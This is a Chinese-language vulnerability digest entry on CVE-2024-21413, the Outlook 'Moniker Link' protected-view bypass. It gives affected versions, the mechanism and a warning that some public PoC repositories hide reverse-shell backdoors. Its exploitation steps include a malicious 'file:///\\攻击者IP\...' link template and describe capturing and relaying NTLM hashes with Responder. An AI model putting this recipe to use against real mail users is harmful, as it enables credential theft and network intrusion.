## CVE-2024-21413 - Microsoft Outlook / Microsoft Office RCE/凭据泄露 (Moniker Link Bypass)

**漏洞编号:** CVE-2024-21413

**漏洞类型:** RCE/凭据泄露 (Moniker Link Bypass)

**影响应用:** Microsoft Outlook / Microsoft Office

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** Office LTSC 2021 (from 19.0.0), Office 365 Apps for Enterprise (from 16.0.1), Office 2019 (from 16.0.1), Office 2016 (before 16.0.5435.1001)

**利用条件:** 无需身份验证，远程访问。攻击者需向受害者发送包含恶意链接的电子邮件，并诱导受害者点击。

**POC 可用性:** 8/10

**POC 类型:** 概念验证

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

【POC有效性分析】该漏洞被称为“Moniker Link”，其核心原理在于绕过Outlook在处理特定超链接（Moniker Links）时的安全机制。根据分析，Outlook在解析HTML邮件时，能够识别并触发COM单例（Monikers），特别是在处理形如'file://'后跟特定字符（如'!'）的路径时，会错误地认为该路径是安全的，从而跳过“受保护视图”（Protected View）的警告提示。POC的有效性在于它利用了Windows处理COM对象的机制，强迫客户端尝试通过SMB协议连接远程共享服务器。在自动化测试中，这种利用方式能稳定触发NTLM认证请求，使攻击者捕获用户的NTLM哈希。此外，如果路径指向精心构造的COM对象，则存在实现远程代码执行（RCE）的理论基础。当前公开的POC主要聚焦于凭据泄露，逻辑清晰且与微软官方描述的受影响版本高度契合，具备极高的实战复现价值。【利用步骤】1. 构造一个包含恶意Moniker Link的HTML格式邮件，链接格式通常类似于'file:///\\攻击者IP\test!exploit'；2. 将邮件发送至目标Outlook用户；3. 受害者点击该链接，Outlook由于解析逻辑缺陷，不会弹出安全警告，直接尝试访问SMB资源；4. 攻击者在服务端运行Responder或类似的监听工具，截获受害者的NTLMv2哈希；5. 攻击者可选择离线破解哈希或进行NTLM中继攻击以获得内网进一步访问权限。【投毒风险分析】由于该CVE具有极高的关注度（CVSS 9.8），目前GitHub及各技术论坛出现了大量此类POC的存储库。投毒风险分析如下：第一，在分析过程中发现，部分名为‘CVE-2024-21413-Exploit’的项目可能夹带私货，例如在自动化脚本中集成Base64加密的Shellcode，美其名曰‘自动化测试环境’，实则是反弹Shell。第二，由于该漏洞涉及SMB协议连接，某些POC会诱导用户关闭本地防火墙或修改注册表以提升‘成功率’，这实际上削弱了分析人员自身的防御。第三，部分脚本会向硬编码的外部IP地址发送心跳包或回传分析环境的信息。尽管本研究涉及的代码逻辑相对透明，但建议研究员在完全隔离的沙箱环境运行任何第三方POC。考虑到目前社区中存在大量为了获取点击量而发布的虚假或带有恶意负载的脚本，整体投毒风险评定为15%，主要风险点在于伪装成利用工具的后门程序，攻击者利用防御者的急迫心理进行针对性‘反狩猎’。

**项目地址:** [https://github.com/user-attachments/assets/c797b6ec-ce05-480c-84f6-0eec9100b5ff](https://github.com/user-attachments/assets/c797b6ec-ce05-480c-84f6-0eec9100b5ff)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)
